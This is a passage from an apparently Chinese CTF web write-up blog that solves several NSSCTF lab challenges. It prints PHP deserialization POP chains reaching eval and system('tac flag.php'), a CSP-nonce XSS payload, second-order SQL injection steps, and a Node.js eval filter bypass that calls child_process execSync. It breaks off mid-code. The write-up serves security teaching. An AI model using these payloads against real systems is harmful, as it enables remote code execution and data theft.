class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道的思路很简单，传入的是$pdata，他直接在源码里new了，只有name是我们可控的，同时我们发现后面又有replace！可以进行字符串逃逸了！！那就很简单了，把$key,$basedata逃逸出来改值就可以！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;N;s:2:&quot;ob&quot;;N;&#125;   53</span><br></pre></td></tr></table></figure><p>这里给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pdata</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逃逸出key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data_replace</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span>=<span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$youwant</span>=<span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$nothing</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$out</span>-&gt;a=<span class="variable">$youwant</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;t=<span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;a=&amp;<span class="variable">$nothing</span>-&gt;b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nothing</span>);</span><br></pre></td></tr></table></figure><p>UUCTF中的__wakeup()中也有一个unserialize()，传参basedata，这里的pop链在上面也有了，要注意的一点就是nothing中的__wakeup()和__unserialize()，这里的wakeup会清空a属性的值，同时我们发现php版本又不符合那个cve，我们又发现destruct中有对b属性的赋值，那么我们通过引用赋值将ab联合起来。这样问题就迎刃而解了。</p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>关于http协议的题，有一点小盲点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://node1.anna.nssctf.cn:28246/ -H “client-ip:127.0.0.1” -H “Referer:pornhub.com” -H “User-Agent:Chrome” -H “Via:Clash.win”</span><br></pre></td></tr></table></figure><h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><p>存在CSP策略，需要绕过，抓包看看</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png" alt="image-20241213210502761"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-29de6fde0db5686d&#x27;</span><br></pre></td></tr></table></figure><p>关键点如上，允许nonce-29de6fde0db5686d</p><p>那么构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28378/?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(flag)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4f323f4-020d-4821-bc1a-efd73ce09f89&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2020-greatphp"><a href="#极客大挑战-2020-greatphp" class="headerlink" title="[极客大挑战 2020]greatphp"></a>[极客大挑战 2020]greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$str</span>=~(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">1</span>);<span class="variable">$y</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;lover=<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为啥不能`whoami&#96;这样输出，奇怪</p><p>那就只能include了，但是引号被过滤，两次取反来绕过。</p><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p>二次注入加sqlite注入，不是很熟悉</p><p>二次注入的步骤，先注册一个admin’–+进去，发现有个修改密码，修改密码处将admin’–+放进去，那么改的就是admin的密码，直接拿下admin，进去sqlite注入就行，这里用python脚本或者sqlmap都是可以的！</p><h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>f12网页源码这种存在这样的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;ADMIN&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">passwd</span> === <span class="string">&#x27;admin123&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">// 登录成功，设置 session</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里需要注意一点，ctrl+u或者右键查看网页源代码是看不到这段的。</p><p>这里采用nodejs的大小写特性来绕过，nodejs笔记里有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın</span><br></pre></td></tr></table></figure><p>登陆进去后是一个calc界面，同样f12查看源代码获取源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//截取</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//去空</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的同学过滤了一些比较危险的东西</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png" alt="image-20241216165920626"></p><p>这里可以调试一下，方便看！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png" alt="image-20241216170014770"></p><p>我们发现是可以逃逸出来的，因为取的calc[i]是大于一位的，而.split出来只有一位，所以是不相等的。可以利用此处的漏洞来进行逃逸。</p><p>让这个单独的一位在很后面就行，大于要逃逸的字符串的长度即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png" alt="image-20241216173859525" style="zoom: 67%;" /><p>这里本来想直接cat &#x2F;xxxxxx.flag，但是存在长度限制，失败。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br></pre></td></tr></table></figure><p>想办法，这里用星号不可以</p><p>同时过滤了x，不能用exec，但是这可以绕过！</p><p>这里本来想着用十六进制绕过，但是不可以，实测</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png" alt="image-20241216174248130"></p><p>我想可能是因为已经在for循环中被解析出来了，就已经是x了，而对x的检测再最后，所以没法绕过</p><p>但是还有一种方法。因为我们通过require导入的模块是一个Object，那么就可以通过Object.values获取到child_process里面的各种方法，那么再通过数组下标[5]就可以得到execSync了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();</span><br></pre></td></tr></table></figure><p>以上由于长度限制，因此只能通过写文件和读文件分离来获取flag了！</p><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>打开后是一个注册+登录界面，遇到这种情况一般都是先注册再登陆进去的，接下来可能有权限的提升等等。</p><p>进去后发现三个功能点。</p><ul><li>上传文件</li><li>下载文件</li><li>删除文件</li></ul><p>我们发现下载文件处存在任意文件读取！</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png" alt="image-20241217102936436" style="zoom: 67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span 